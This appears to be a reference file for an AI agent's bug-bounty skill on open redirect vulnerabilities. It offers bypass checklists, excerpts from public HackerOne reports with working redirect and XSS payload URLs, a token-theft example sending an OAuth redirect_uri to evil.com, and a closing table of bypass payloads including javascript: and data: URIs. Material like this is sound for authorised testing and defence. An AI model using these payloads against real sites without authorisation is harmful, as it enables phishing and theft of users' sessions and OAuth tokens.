# Open Redirect — Combined Field Guide — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Quick wins



Start here. These are the highest-yield tests for this class.



- Find redirect params: next, url, return, redirect_uri, continue, callback, dest, image_url.

- Test scheme-relative `//evil.com`, backslashes, `@`, unicode dots, and double encoding.

- Bypass allowlists with userinfo, subdomain suffix, and path confusion.

- Check login/logout, OAuth callbacks, shorteners, and mobile deep links.



## Bypass tricks



- Double URL-encode, unicode normalize, and mixed case the scheme/host.

- Use an allowlisted host with an open redirect to reach the final target.

- Exploit parser differences between validation and navigation.



## Deeper checklist



- Find redirect params: next, url, return, redirect_uri, continue, callback, dest, image_url.

- Try scheme-relative `//evil.com`, backslashes, `@`, unicode dots, and double encoding.

- Bypass allowlists with userinfo tricks, subdomain suffix, and path confusion.

- Test redirectors in OAuth/SSO flows and mobile deep links.

- Chain with OAuth token theft or SSRF allowlist bypass for higher impact.

- Confirm the browser actually navigates off-domain (not just a 302 to an error page).



## Techniques from real reports



One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.



- **[cs.money] Open Redirect Leads to Account Takeover** — `#905607` · CS Money · $0 · ▲357

  > Open this url `https://auth.dota.trade/login?redirectUrl=https://cs.money///loving-turing-29a494.netlify.app%2523&callbackUrl=https://cs.money///loving-turing-29a494.netlify.app%2523` , the login url was gotten from `cs.money` index page button `sign in…

- **XSS and Open Redirect on MoPub Login** — `#683298` · X / xAI · $1,540 · ▲248

  > Here's a proof of concept using the URL javascript:alert("proof of concept"):

- **[PayPal Android] Remote theft of user session using push_notification_webview deeplink** — `#424443` · PayPal · $0 · ▲188

  > A deeplink feature built into the PayPal Android application failed to validate the requested endpoint.

- **Open redirect at https://inventory.upserve.com/http://google.com/** — `#469803` · Upserve · $1,200 · ▲179

  > https://inventory.upserve.com/http://stanko.sh/

- **Open Redirect in Logout & Login** — `#1788006` · Expedia Group Bug Bounty · $0 · ▲171

  > GET /?logout=https://qx4lw1nsec.blogspot.com HTTP/2

- **[Venmo Android] Remote theft of user session** — `#401940` · PayPal · $0 · ▲151

  > Khilly highlighted a logic flaw in the Venmo app’s use of `android.net.Uri` parser, which we further explored together.

- **Open redirect due to scanning QR code via brave browser** — `#1946534` · Brave Software · $0 · ▲148

  > https://resources.infosecinstitute.com/topic/security-attacks-via-malicious-qr-codes/

- **Open Redirect on central.uber.com allows for account takeover** — `#206591` · Uber · $0 · ▲144

  > When logging into `central.uber.com`, the `state` parameter for login.uber.com contained a redirect location instead of a CSRF token.

- **Open redirect** — `#2957962` · XVIDEOS · $0 · ▲143

  > An open redirect vulnerability was discovered on the website https://www.xnxx.com/todays-selection/1.

- **1-Click Account Takeover via Open Redirect through Regex Bypass in Domain Validation** — `#3723458` · Khan Academy · $0 · ▲126

  > The issue is that dots between `uc`, `a`, `run`, and `app` are not escaped , meaning it could be any character, not necessarily a dot (`.`).

- **Open URL Redirection** — `#1238684` · Unikrn · $0 · ▲102

  > Reference: https://www.owasp.org/index.php/Unvalidated Redirects and Forwards Cheat Sheet

- **CRLF to XSS & Open Redirection** — `#2012519` · TikTok · $0 · ▲97

  > This could have led to Reflective XSS (Cross-Site Scripting) to gain access to a user's cookies, or the ability to send users to unauthorized webpages ending in "tiktok.com" via an open redirect.

- **Twitter lite(Android): Vulnerable to local file steal, Javascript injection, Open redirect** — `#499348` · X / xAI · $0 · ▲95

  > To reproduce javascript injection: adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "javascript://example.com%0A alert(1);"

- **OAuth redirect uri validation bypass for :proxima_first_party_sync apps** — `#3588801` · GitHub · $0 · ▲79

  > [CVE-2026-4296](https://nvd.nist.gov/vuln/detail/CVE-2026-4296)

- **another liberapay member team twitter account broken Link Hijacking via Expired Twitter Account Link** — `#3723002` · Liberapay · $0 · ▲77

  > Hello again i discovered that there is another Liberapay profile of Liberapay team member at liberapay.com/mdvhimself contains a link to an expired Twitter account, creating a Broken Link Hijacking (BLH) vulnerability.

- **[dev.twitter.com] XSS and Open Redirect** — `#260744` · X / xAI · $1,120 · ▲75

  > XSS via Request-URI which requires user interaction.

- **Open Redirect** — `#1213580` · Affirm · $250 · ▲74

  > POC:https://www.affirm.com///google.com/?www.affirm.com/?category=interview&page=2

- **Bypass of Open Redirect Fix on lovable.dev via /..// Path Traversal in redirect parameter** — `#3599248` · Lovable VDP · $0 · ▲74

  > The server normalizes the path traversal `/../` and then treats `//google.com` as a

- **Open Redirect on ███████** — `#2265413` · Fastly VDP · $0 · ▲74

  > 3.Submit the request and observe that the page is redirected to the malicious URL.

- **open redirected by host header** — `#2828499` · Localize · $0 · ▲73

  > go to www.localizestaging.com and interpret then change host header .it will redirect to changed host header webisite

- **Open Redirect** — `#504751` · Omise · $100 · ▲72

  > GET /%2f%2f%2fbing.com%2f%3fwww.omise.co/?category=interview&page=2 HTTP/1.1

- **Identity Login Page Redirect Can Be Manipulated** — `#243474` · Inflection · $0 · ▲72

  > I used this request to try login https://www.identity.com/signin?redirect url=%2Foauth%2Fauthorize%3Fclient id%3D241f887e145f09298fc7f3459cefa080cd7abd30b7b0192977b5bb72965e0583%26redirect uri%3D%252Ftest-callback%26response…

- **Possible to redirect to a (non-existing) subdomain after logging in via GitHub (leaking the token)** — `#292825` · Ed · $0 · ▲71

  > Go to https://github.com/login/oauth/authorize?client id=5f45cc999f7812d0b6d2&redirect uri=https%3A%2F%2Fnonexisting.edoverflow.com&scope=public repo

- **Chained open redirects and use of Ideographic Full Stop defeat Twitter's  approach to blocking links** — `#1032610` · X / xAI · $560 · ▲70

  > Append the result of step 3 to `https://analytics.twitter.com/daa/0/daa optout actions?action id=4&rd=` and append `%3F` to the result: `https://analytics.twitter.com/daa/0/daa optout actions?action id=4&rd=https%3A%2F%2Fddosecrets%25E3%2580%2582com%3F`.

- **Open Redirect Vulnerability in OAuth Flow Leading to Potential Phishing Attack** — `#3099816` · Lichess · $0 · ▲70

  > Change this from`redirect uri=https://www.lichess4545.com/auth/lichess/` to `redirect uri=https://example.com/auth/lichess/`

- **Google API key leaks and security misconfiguration leads Open Redirect Vulnerability** — `#1066410` · Clario · $300 · ▲68

  > Hello, when i search your targets and javascript files I found an googleapikey leaks in url = [https://account.clario.co/js/main.044af6485f6b0cd90809.js](https://account.clario.co/js/main.044af6485f6b0cd90809.js "Url").

- **Stealing Users OAuth Tokens through redirect_uri parameter** — `#665651` · GSA Bounty · $750 · ▲67

  > 1, Clicked on link https://login.fr.cloud.gov/oauth/authorize?client id=███&response type=token&redirect uri=https%3A%2F%2Fevil.com%2Fauth%2Fcallback&state=███

- **Liberapay member team twitter account broken Link Hijacking via Expired Twitter Account Link** — `#3721519` · Liberapay · $0 · ▲65

  > Click on the Twitter link https://x.com/martinodelilo

- **Open redirect using theme install** — `#101962` · Shopify · $0 · ▲61

  > Vulnerable Endpoint - https://app.shopify.com/services/google/themes/preview/supply--blue?domain name=example.com

- **Multiple Open Redirect on TikTok domains** — `#2221547` · TikTok · $0 · ▲61

  > An open redirection vulnerability was found via a path traversal on the 'redirect url' parameter when logging in on a TikTok Seller domain, which could have resulted in takeover of a TikTok Seller account.



## Case studies



### [cs.money] Open Redirect Leads to Account Takeover

`#905607` · CS Money · $0 · medium · 2020-09-30 · ▲357

> I found an open redirect on https://cs.money domain, using this payload https://cs.money///google.com we can redirect into any domain that we want, you can see the request and response from this image below : ███



### XSS and Open Redirect on MoPub Login

`#683298` · X / xAI · $1,540 · n/a · 2019-09-24 · ▲248

> Summary: I found open redirect at the MoPub login page, https://app.mopub.com/login?next=https://google.com. It also allows javascript URIs, leading to XSS. Description: You can modify the "next" URL parameter to redirect to any website upon logging in on MoPub. Steps To Reproduce: 1. Take this URL: https://app.mopub.com/login?next=https://google.com 2. Change "https://google.com" to whatever URL you want to redirect to. 3. Visit the URL and login 4.



### [PayPal Android] Remote theft of user session using push_notification_webview deeplink

`#424443` · PayPal · $0 · medium · 2019-02-07 · ▲188

> A deeplink feature built into the PayPal Android application failed to validate the requested endpoint. A specifically crafted request from a website or separate app on the device could call the deeplink and direct traffic to any destination. While the impact was limited by compensating controls, headers containing sensitive data could be collected by a malicious actor.



### Open redirect at https://inventory.upserve.com/http://google.com/

`#469803` · Upserve · $1,200 · medium · 2019-06-07 · ▲179

> The following URL is vulnerable to an open redirect (it will redirect to stanko.sh): https://inventory.upserve.com/http://stanko.sh/ Impact Users could get redirected to malicious domain.



### Open Redirect in Logout & Login

`#1788006` · Expedia Group Bug Bounty · $0 · medium · 2023-03-02 · ▲171

> Entry Hello there! While browsing on expedia, I logged out of the account and as soon as I logged out, it was calling me a parameter called "rurl" directly on the link, I examined it and was able to redirect successfully. Default Request GET /?logout=1 HTTP/2 Host: www.expedia.com Cookie: { REDACTED } User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0 Accept:…



## Query the corpus



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class open-redirect --limit 20

python3 ~/.local/share/hackerone-reports/h1.py stats --class open-redirect

python3 ~/.local/share/hackerone-reports/h1.py show <id> --full

```



Search by technology, endpoint, parameter, or program. Examples:



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class open-redirect

python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class open-redirect --min-bounty 1000

```



## Bypass Table



| Technique | Payload |

|-----------|---------|

| Basic | `https://evil.com` |

| Protocol relative | `//evil.com` |

| Backslash bypass | `/\\evil.com` |

| At-sign confusion | `https://target.com@evil.com` |

| Double slash | `//evil.com/%2F..` |

| URL encoding | `%2Fevil.com` |

| Null byte | `evil.com%00target.com` |

| Whitespace | `evil.com%09` or `%20` |

| JavaScript URI | `javascript:window.location='https://evil.com'` |

| Data URI | `data:text/html,<script>window.location='https://evil.com'</script>` |

| Subdomain | `https://target.com.evil.com` |

| Fragment | `https://evil.com#.target.com` |



---
